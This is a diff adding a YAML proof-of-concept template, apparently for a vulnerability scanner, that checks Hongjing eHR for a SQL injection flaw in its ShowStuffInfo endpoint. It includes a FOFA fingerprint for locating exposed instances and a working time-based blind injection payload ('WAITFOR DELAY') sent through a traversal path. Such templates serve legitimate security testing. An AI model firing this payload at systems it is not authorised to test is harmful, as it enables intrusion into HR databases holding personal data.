@@ -1,0 +1,27 @@
+id: poc-yaml-hongjing-ehr-showstuffinfo-sqli
+info:
+  name: 宏景eHR ShowStuffInfo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /templates/index/hcmlogon.jsp
+  expression: status_code == 200 && contains(body,"/css/hcm/login.css")
+- method: GET
+  path: /templates/attestation/../../jp_contest/personinfo/ShowStuffInfo?id=1';WAITFOR+DELAY+'0:0:{{.t1}}'--+
+  expression: 'status_code == 200  &&
+
+    body == "" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
